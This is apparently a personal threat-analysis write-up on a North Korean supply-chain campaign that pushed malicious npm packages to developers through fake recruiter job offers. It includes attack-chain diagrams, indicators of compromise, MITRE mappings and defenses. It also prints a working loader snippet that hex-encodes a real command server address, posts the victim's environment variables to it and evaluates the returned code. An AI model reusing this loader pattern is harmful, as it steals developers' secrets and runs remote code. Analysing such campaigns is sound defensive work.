<div align="center">
  <p>⚠️🏗️🚧🦺🧱🪵🪨🪚🛠️👷</p>
  <i>This is a working draft in progress.</i>
  <br/>
  
  <br/>
  <blockquote>
	  <em>The scene is from the series <b>Mr. Robot</b>
    <br/>
    <a href="https://www.usanetwork.com/mr-robot">Mr. Robot Official Site</a></em>
	  <br/>
	  <i>gif image is provided by <a href="https://giphy.com">Giphy</a></i>
    <br/>
  </blockquote>
  <p>⚠️🏗️🚧🦺🧱🪵🪨🪚🛠️👷</p>

</div>

# 🌊 Another Wave: North Korean "Contagious Interview" Campaign
<details open>
<summary>Click to show/hide the full disclaimer.</summary>
   
> <ins>📢 **Disclaimer** 🚨</ins>
>
> This document contains my personal notes on the topic,
> compiled from publicly available documentation and various cited sources.
> The materials are intended for educational purposes (<ins>sometimes, entertainment purposes</ins>), personal study, and reference.
> The content is dual-licensed:
> 1. **MIT License:** Applies to all code implementations (Swift, Mermaid, and other programming languages).
> 2. **Creative Commons Attribution-ShareAlike 4.0 International License (CC BY-SA 4.0):** Applies to all non-code content, including text, explanations, diagrams, and illustrations.

</details>


----


The Socket Threat Research Team has uncovered an extended and ongoing supply chain attack orchestrated by North Korean threat actors, famously known as the "Contagious Interview" operation. This campaign involves publishing malicious npm packages that employ a stealthy multi-stage malware loader.

---

## 💎 Diamond Model of Intrusion Analysis

The Diamond Model provides a structured way to analyze cyber intrusion events. Here's how it applies to the HexEval Loader campaign:


This model highlights the key elements:
*   **Adversary 😈:** North Korean threat actors associated with the "Contagious Interview" campaign.
*   **Capability 🛠️:** The tools and techniques used, including the HexEval Loader, BeaverTail malware, InvisibleFerret backdoor, a keylogger, typosquatting, and social engineering.
*   **Infrastructure 🏗️:** The systems and resources supporting the attack, such as typosquatted npm packages, fake LinkedIn profiles and email accounts, C2 (Command and Control) servers hosted on platforms like Vercel, and malicious Bitbucket repositories.
*   **Victim 🎯:** Software developers and job seekers, primarily approached via LinkedIn.

----

## ⛓️ High-Level Attack Chain

The attack unfolds in a series of steps, from initial contact to potential deep system compromise:

```mermaid
graph TD
    A["👨‍💻 Attacker<br/>(DPRK Group)"] -->|Identifies Target via OSINT| B("🎯 Developer/<br/>Job Seeker on LinkedIn")
    B -->|"Receives Fake Recruiter Outreach 📧"| C{"Engages with <i>Recruiter</i>"}
    C -- Yes --> D("Sent <i>Coding Assignment</i> via Google Docs/PDFs")
    D --> E{"Clones Repo / Installs Malicious npm Package"}
    subgraph Malicious Package Execution
    direction LR
        E --> F("HexEval Loader Activates")
        F -->|Collects Host Metadata| G("Sends to C2 Server 📡")
        G -->|C2 Selectively Responds| H("Receives Stage 2:<br/>BeaverTail 🦫")
        H -->|"Executes <code>eval(r.data)</code>"| I(BeaverTail Infostealer/Loader Runs)
        I -->|"Searches for Sensitive Data 🔑<br>(Browser artifacts, Wallets)"| J
        I -->|"Fetches Stage 3:<br/>InvisibleFerret 🕵️"| K("InvisibleFerret Backdoor Deployed")
    end
    E ----> L["Optional:<br/>Keylogger Deployed<br/>(e.g., jsonsecs) ⌨️"]
    K --> M("🔒 Full System Compromise & Persistence")
    J --> M
    L --> M
    C -- No --> N("Attack Ends for this Target")

    style A fill:#ffadad,stroke:#333,stroke-width:2px
    style B fill:#ffd6a5,stroke:#333,stroke-width:2px
    style C fill:#fdffb6,stroke:#333,stroke-width:2px
    style D fill:#caffbf,stroke:#333,stroke-width:2px
    style E fill:#9bf6ff,stroke:#333,stroke-width:2px
    style F fill:#a0c4ff,stroke:#333,stroke-width:2px
    style G fill:#a0c4ff,stroke:#333,stroke-width:2px
    style H fill:#bdb2ff,stroke:#333,stroke-width:2px
    style I fill:#bdb2ff,stroke:#333,stroke-width:2px
    style J fill:#ffc6ff,stroke:#333,stroke-width:2px
    style K fill:#ffc6ff,stroke:#333,stroke-width:2px
    style L fill:#9ADCFF,stroke:#333,stroke-width:2px
    style M fill:#ff6961,stroke:#333,stroke-width:2px
    style N fill:#e0e0e0,stroke:#333,stroke-width:2px
```



-----

## 🎣 Social Engineering: The Initial Foothold

The campaign heavily relies on social engineering, preying on the trust job seekers place in recruiters.

```mermaid
sequenceDiagram
    participant TA as Threat Actor 🎭
    actor V as Victim<br/>(Developer) 👨‍💻
    participant LI as LinkedIn
    participant GD as Google Docs/Assignments
    participant NPM as npm Registry / Repo
    participant C2 as C2 Server 📡

    TA->>LI: Creates Fake Recruiter Profile
    TA->>V: Sends Connection Request / Job Offer <br/>(via LinkedIn)
    Note over V: Receives attractive (often remote) job offer
    V->>TA: Engages in conversation
    TA->>GD: Prepares "Coding Assignment" <br/>(e.g., Google Doc linking to repo)
    TA->>V: Sends Coding Assignment
    V->>GD: Accesses assignment
    Note over V: Assignment instructs to clone repo /<br/> use specific npm packages
    V->>NPM: Clones Repo /<br/> Installs Malicious Package
    activate NPM
    NPM-->>V: Malicious Package (containing HexEval) Downloaded
    deactivate NPM
    Note over V: Runs code as part of assignment
    V->>V: HexEval Loader executes!
    V->>C2: HexEval sends host data
    activate C2
    C2-->>V: Delivers BeaverTail<br/>(Stage 2)
    deactivate C2
    V->>V: BeaverTail executes!
    TA->>V: (Optional) Requests Video Call, Pressures to run code outside Docker, screen-share
    TA->>LI: Deletes Profile /<br/> Blocks Victim (Covers Tracks)
```



----

## 겹겹이 쌓인 인형 (Nesting Dolls): A Multi-Stage Malicious Arsenal 🪆

The malware uses a "nesting doll" structure to evade detection and gradually increase its capabilities.

### Stage 1: HexEval Loader 📜

This is the initial payload embedded within the typosquatted npm packages. Its primary job is to deobfuscate critical strings, collect system information, and fetch the next stage.

**Anatomy of a Typical HexEval Loader:**

The loader uses a helper function (often named `g`) to decode hexadecimal strings at runtime.

```javascript
// Decode a hex-encoded string at run time
function g(h) {
  return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16)));
}

// Array of hex-encoded strings (module names, C2 URL, etc.)
const hl = [
  g('72657175697265'), // "require"
  g('6178696f73'),     // "axios"
  g('706f7374'),       // "post"
  // C2 endpoint, e.g., hxxp://ip-check-server[.]vercel[.]app/api/ip-check/208
  g('687474703a2f2f69702d636865636b2d7365727665722e76657263656c2e6170702f6170692f69702d636865636b2f323038'),
  g('7468656e')        // "then"
];

// Main execution logic
module.exports = () =>
  require(hl[1]) // require("axios")
    [hl[2]](     // .post(
      hl[3],     //   C2_URL,
      { ...process.env } //   environment data
    )
    [hl[4]](r => eval(r.data)) // .then(r => eval(r.data))
    .catch(() => {});          // Ignore errors
```

**Flow of the HexEval Loader:**


The C2 servers (`hxxps://log-server-lovat[.]vercel[.]app/api/ipcheck/703`, `hxxps://ip-check-server[.]vercel[.]app/api/ip-check/208`, `hxxps://ip-check-api[.]vercel[.]app/api/ipcheck/703`) often return benign data like IP geolocation or `undefined`, suggesting they selectively serve malicious payloads based on request headers or other runtime conditions to evade detection.

### Stage 1 Variant: The Cross-Platform Keylogger (`jsonsecs`) ⌨️

The npm alias `jtgleason` published a package named `jsonsecs` that included the HexEval Loader *plus* a cross-platform keylogger.

**Keylogger Mechanism in `jsonsecs`:**

```mermaid
graph TD
    Start(("<code>jsonsecs</code> Execution")) --> A["Import <code>os</code> module"]
    A --> B{"Detect OS Platform<br/>(<code>os.platform()</code>)"}
    B -- Windows --> C1["Load <code>WinKeyServer</code> binary 🪟"]
    B -- macOS --> C2["Load <code>MacKeyServer</code> binary 🍎"]
    B -- Linux/Unix --> C3["Load <code>X11KeyServer</code> binary 🐧"]
    C1 --> D["Hook Low-Level Keyboard Input Events"]
    C2 --> D
    C3 --> D
    D --> E["Capture Keystrokes"]
    E --> F{"Arbitrary Handlers<br/>(Listeners)"}
    F --> G["Exfiltrate Data /<br/>Real-Time Surveillance 📡"]
    G --> End(("Keystrokes Captured & Sent"))

    style C1 fill:#87CEFA,stroke:#333,stroke-width:1px
    style C2 fill:#D3D3D3,stroke:#333,stroke-width:1px
    style C3 fill:#FFD700,stroke:#333,stroke-width:1px
    style E fill:#FFA07A,stroke:#333,stroke-width:1px
    style G fill:#FF6347,stroke:#333,stroke-width:1px
```



This demonstrates the attackers' ability to tailor payloads for deeper surveillance on specific targets.

### Stage 2: BeaverTail Malware 🦫

Retrieved by the HexEval loader (e.g., from `172[.]86[.]80[.]145:1224`), BeaverTail is an infostealer and a loader for the next stage.

**BeaverTail Functionality:**


### Stage 3: InvisibleFerret Backdoor 🕵️

This is the third-stage payload downloaded and executed by BeaverTail. It provides the attackers with persistent, deeper control over the compromised system.

### 🔄 Overall Malware Staging

This multi-stage approach enhances evasion and allows attackers to deploy specific tools based on the target environment.


----

## 💨 Evasion Tactics

The threat actors employ several tactics to evade detection:

1.  **Multi-Stage Loading:** The full malicious capability is not present in the initially downloaded npm package. This makes static analysis of the npm package itself less likely to flag it as malicious.
2.  **Hex Encoding:** Critical strings like module names (`require`, `axios`) and C2 URLs are hex-encoded, only decoded at runtime. This bypasses simple string-matching detection.
3.  **Conditional C2 Payload Delivery:** C2 servers often return benign data or `undefined`, likely serving the actual malicious second-stage (BeaverTail) only when specific conditions are met (e.g., certain IP ranges, user agents, or system profiles), making it harder for security researchers to retrieve and analyze the payload.
4.  **Typosquatting:** Using names similar to popular, legitimate packages (e.g., `reactbootstraps` for `react-bootstrap`) to trick developers.
5.  **Minimal On-Registry Footprint:** The HexEval loader itself is relatively small and can appear innocuous on cursory review.
6.  **Pressure to Bypass Containers:** Urging victims to run code outside Docker or other sandboxed environments ensures the malware has full access to the host system.

----

## 🚩 Indicators of Compromise (IOCs)

This section lists various indicators associated with this campaign. Defanged URLs use `hxxps` and `[.]`.

### Malicious npm Packages (35 identified)

| Package Name                | Link (Socket.dev)                                          |
| :-------------------------- | :--------------------------------------------------------- |
| `react-plaid-sdk`           | [Link](https://socket.dev/npm/package/react-plaid-sdk)     |
| `sumsub-node-websdk`        | [Link](https://socket.dev/npm/package/sumsub-node-websdk)  |
| `vite-plugin-next-refresh`  | [Link](https://socket.dev/npm/package/vite-plugin-next-refresh)|
| `vite-plugin-purify`        | [Link](https://socket.dev/npm/package/vite-plugin-purify)  |
| `nextjs-insight`            | [Link](https://socket.dev/npm/package/nextjs-insight)      |
| `vite-plugin-svgn`          | [Link](https://socket.dev/npm/package/vite-plugin-svgn)    |
| `node-loggers`              | [Link](https://socket.dev/npm/package/node-loggers)        |
| `react-logs`                | [Link](https://socket.dev/npm/package/react-logs)          |
| `reactbootstraps`           | [Link](https://socket.dev/npm/package/reactbootstraps)     |
| `framer-motion-ext`         | [Link](https://socket.dev/npm/package/framer-motion-ext)   |
| `serverlog-dispatch`        | [Link](https://socket.dev/npm/package/serverlog-dispatch)  |
| `mongo-errorlog`            | [Link](https://socket.dev/npm/package/mongo-errorlog)      |
| `next-log-patcher`          | [Link](https://socket.dev/npm/package/next-log-patcher)    |
| `vite-plugin-tools`         | [Link](https://socket.dev/npm/package/vite-plugin-tools)   |
| `pixel-percent`             | [Link](https://socket.dev/npm/package/pixel-percent)       |
| `test-topdev-logger-v1`     | [Link](https://socket.dev/npm/package/test-topdev-logger-v1)|
| `test-topdev-logger-v3`     | [Link](https://socket.dev/npm/package/test-topdev-logger-v3)|
| `server-log-engine`         | [Link](https://socket.dev/npm/package/server-log-engine)   |
| `logbin-nodejs`             | [Link](https://socket.dev/npm/package/logbin-nodejs)       |
| `vite-loader-svg`           | [Link](https://socket.dev/npm/package/vite-loader-svg)     |
| `struct-logger`             | [Link](https://socket.dev/npm/package/struct-logger)       |
| `flexible-loggers`          | [Link](https://socket.dev/npm/package/flexible-loggers)    |
| `beautiful-plugins`         | [Link](https://socket.dev/npm/package/beautiful-plugins)   |
| `chalk-config`              | [Link](https://socket.dev/npm/package/chalk-config)        |
| `jsonpacks`                 | [Link](https://socket.dev/npm/package/jsonpacks)           |
| `jsonspecific`              | [Link](https://socket.dev/npm/package/jsonspecific)        |
| `jsonsecs`                  | [Link](https://socket.dev/npm/package/jsonsecs)            |
| `util-buffers`              | [Link](https://socket.dev/npm/package/util-buffers)        |
| `blur-plugins`              | [Link](https://socket.dev/npm/package/blur-plugins)        |
| `proc-watch`                | [Link](https://socket.dev/npm/package/proc-watch)          |
| `node-orm-mongoose`         | [Link](https://socket.dev/npm/package/node-orm-mongoose)   |
| `prior-config`              | [Link](https://socket.dev/npm/package/prior-config)        |
| `use-videos`                | [Link](https://socket.dev/npm/package/use-videos)          |
| `lucide-node`               | [Link](https://socket.dev/npm/package/lucide-node)         |
| `router-parse`              | [Link](https://socket.dev/npm/package/router-parse)        |

### Threat Actor Identifiers

**npm Aliases (24 identified):**
`liamnevin`, `pablomendes`, `bappda`, `jvinter97`, `eric.c01`, `maryanaaaa`, `npmdev001`, `loveryon`, `supermmm`, `topdev0921`, `hansdev0512`, `abdulrahman_nasser`, `marsinc326`, `cristoper52`, `shauncepla`, `marthamoon014`, `jtgleason`, `grace107`, `business00747`, `supercrazybug`, `alexander0110819`, `purpledev07`, `mariasam`, `oleksandrrozgon`

**Email Addresses (19 identified, defanged):**
`alexander0110819@outlook[.]com`, `maria.sam.recruiter@gmail[.]com`, `toptalent0921@gmail[.]com`, `business00747@gmail[.]com`, `eric.c01.recruit@gmail[.]com`, `hiring.dev.hr@gmail[.]com`, `carrie.bale.recruit@gmail[.]com`, `emilyjobs.rec2023@gmail[.]com`, `mars.recruiting.hiring@gmail[.]com`, `shauncepla.hrteam@gmail[.]com`, `grace.chen.recruitment@gmail[.]com`, `grace107jobs@gmail[.]com`, `abdulrahman.nasser.hr@gmail[.]com`, `marthamoon014@gmail[.]com`, `sofia.helman@outlook[.]com`, `supercrazybug.team@gmail[.]com`, `maryanaaaa.hrteam@gmail[.]com`, `topdev0921@gmail[.]com`, `natalie.dev.hr@gmail[.]com`

### Malicious Bitbucket Repositories (defanged)

*   `hxxps://bitbucket[.]org/notion-dex/ultrax`
*   `hxxps://bitbucket[.]org/zoro-workspace/`

### Command and Control (C2) Endpoints (defanged)

*   `hxxps://log-server-lovat[.]vercel[.]app/api/ipcheck/703`
*   `hxxps://ip-check-server[.]vercel[.]app/api/ip-check/208`
*   `hxxps://ip-check-api[.]vercel[.]app/api/ipcheck/703`
*   `172[.]86[.]80[.]145` (likely associated with port `1224` for BeaverTail retrieval)

### SHA256 Hashes (Keylogger Binaries)

*   `e58864cc22cd8ec17ae35dd810455d604aadab7c3f145b6c53b3c261855a4bb1` — WinKeyServer
*   `30043996a56d0f6ad4ddb4186bd09ffc1050dcc352f641ce3907d35174086e15` — MacKeyServer
*   `6e09249262d9a605180dfbd0939379bbf9f37db076980d6ffda98d650f70a16d` — X11KeyServer

----

## 🗺️ MITRE ATT&CK® Techniques Observed

This campaign maps to several techniques within the MITRE ATT&CK framework:

| Tactic                      | Technique ID | Technique Name                                                                | Description in Campaign                                                                                                |
| :-------------------------- | :----------- | :---------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------- |
| **Initial Access**          | T1195.002    | Supply Chain Compromise: Compromise Software Supply Chain                     | Publishing malicious npm packages.                                                                                     |
|                             | T1566        | Phishing                                                                      | Social engineering via LinkedIn to lure victims. (Though not explicit phishing, the social engineering aspect aligns)  |
| **Execution**               | T1059.007    | Command and Scripting Interpreter: JavaScript                                 | `eval()` used to execute payloads from C2.                                                                             |
|                             | T1204.002    | User Execution: Malicious File                                                | Victims run malicious code as part of "coding assignments".                                                            |
| **Persistence**             |              | *Implied by InvisibleFerret backdoor*                                         |                                                                                                                        |
| **Privilege Escalation**    |              | *Not explicitly detailed, but backdoor access allows potential further actions* |                                                                                                                        |
| **Defense Evasion**         | T1027.013    | Obfuscated Files or Information: Encrypted/Encoded File                     | Hex encoding of strings in HexEval Loader.                                                                             |
|                             | T1546.016    | Event Triggered Execution: Installer Packages                                 | Malware executes upon package installation or use.                                                                     |
|                             |              | Multi-Stage Deployment                                                        | Hiding full capability by loading stages sequentially.                                                                 |
| **Credential Access**       | T1555.003    | Credentials from Password Stores: Credentials from Web Browsers               | BeaverTail targets browser cookies and data.                                                                           |
|                             | T1555.001    | Credentials from Password Stores: Keychain                                    | BeaverTail targets macOS keychain databases.                                                                           |
|                             | T1056.001    | Input Capture: Keylogging                                                     | `jsonsecs` package includes cross-platform keylogger.                                                                |
| **Discovery**               | T1082        | System Information Discovery                                                  | HexEval & BeaverTail collect OS, hostname, username, MAC address.                                                      |
|                             | T1083        | File and Directory Discovery                                                  | BeaverTail scans local file systems for specific files/directories.                                                    |
|                             | T1217        | Browser Information Discovery                                                 | BeaverTail targets browser profile directories.                                                                        |
| **Collection**              | T1005        | Data from Local System                                                        | Collecting environment variables, browser data, wallet files.                                                          |
|                             | T1119        | Automated Collection                                                          | BeaverTail systematically scans for and gathers targeted data.                                                         |
| **Command and Control**     | T1041        | Exfiltration Over C2 Channel                                                  | Sending collected data back to attacker-controlled servers.                                                            |
|                             | T1105        | Ingress Tool Transfer                                                         | Downloading BeaverTail and InvisibleFerret from C2.                                                                    |
| **Impact** (Potential)      | T1657        | Financial Theft                                                               | Targeting cryptocurrency wallets implies financial motives.                                                            |
| **Pre-compromise**          | T1608.001    | Stage Capabilities: Upload Malware                                            | Publishing malicious packages to npm registry.                                                                         |

----

## 🛡️ Defense and Mitigation Strategies

The report underscores that traditional static analysis and simple metadata checks are insufficient against such sophisticated attacks. Proactive security tooling is essential. Socket.dev offers solutions like:

*   **GitHub App:** Real-time pull request scanning.
*   **CLI Tool:** Surfaces red flags during `npm install`.
*   **Browser Extension:** Warns about malicious packages on registry sites.

Key takeaways for defense:
*   **Developer Awareness:** Educate developers about social engineering tactics, especially fake job offers.
*   **Scrutinize Dependencies:** Use tools to analyze dependencies for known vulnerabilities and suspicious behaviors.
*   **Verify Recruiter Authenticity:** Be cautious of unsolicited job offers and attempt to verify recruiter identities through official channels.
*   **Sandboxed Environments:** Test new code or assignments in isolated/containerized environments whenever possible.
*   **Principle of Least Privilege:** Ensure development environments and user accounts have only necessary permissions.

This campaign is a stark reminder of the evolving threat landscape in software supply chains, where human elements (social engineering) are combined with technical exploits to compromise even security-conscious developers. Stay vigilant! 🧐

---

<div align="center">
	
	<br/>
	<em>Use knowledge wisely. gif image is provided by <a href="https://giphy.com">Giphy</a></em>
</div>

----

```mermaid
---
title: "❓...CongLeSolutionX....❓"
author: "Cong Le"
version: "1.0"
license(s): "MIT, CC BY-SA 4.0"
copyright: "Copyright (c) 2025 Cong Le. All Rights Reserved."
config:
  theme: base
---
%%%%%%%% Mermaid version v11.4.1-b.14
%%{
  init: {
    'flowchart': { 'htmlLabels': false },
    'fontFamily': 'Bradley Hand',
    'themeVariables': {
      'primaryColor': '#fc82',
      'primaryTextColor': '#F8B229',
      'primaryBorderColor': '#27AE60',
      'secondaryColor': '#559129',
      'secondaryTextColor': '#6C3483',
      'lineColor': '#F8B229',
      'fontSize': '20px'
    }
  }
}%%
flowchart LR
    My_Meme@{ img: "https://raw.githubusercontent.com/CongLeSolutionX/CongLeSolutionX/refs/heads/main/assets/images/My-meme-questions-magnifying-glass-tangled-lines-bubble-thought-flashlight.png", label: "Think<br/>before you type...", pos: "b", w: 200, h: 150, constraint: "off" }
   
    Link_to_my_profile{{"<a href='https://github.com/CongLeSolutionX' target='_blank'>Click here if you care about my profile</a>"}}

  Closing_quote@{ shape: braces, label: "Fellas,<br/>if you got some <ins>skills</ins>,<br/>please<br/>dont make <ins>hacker</ins> become a bad term<br/> in this era<br/>since<br/> my bots 🤖🤖🤖<br/>will eventually<br/>know<br/> who you are!"}
    
   Closing_quote ~~~ My_Meme
    
  Link_to_my_profile{{"<a href='https://github.com/CongLeSolutionX' target='_blank'>Click here if you care about my profile</a>"}}

  Closing_quote ~~~ My_Meme
  My_Meme animatingEdge@--> Link_to_my_profile
  
  animatingEdge@{ animate: true }

```

---
>**Licenses:**
>
>- **MIT License:**  [](LICENSE) - Full text in [LICENSE](LICENSE) file.
>- **Creative Commons Attribution-ShareAlike 4.0 International**: [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/) [](https://creativecommons.org/licenses/by-sa/4.0/) - Legal details in [LICENSE-CC-BY-SA-4.0](THE_PAST/LICENSE-CC-BY-SA-4.0) and at [Creative Commons official site](https://creativecommons.org/licenses/by-sa/4.0/).
>
---

**References:**

*   The primary source for this analysis is the article: "Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages" by Socket Threat Research Team. (As provided in the prompt).
*   Links to specific package details on `socket.dev` as embedded in the original article.
*   [MITRE ATT&CK® Framework](https://attack.mitre.org/) for technique definitions.
*   General cybersecurity knowledge regarding supply chain attacks, malware staging, and social engineering.

----
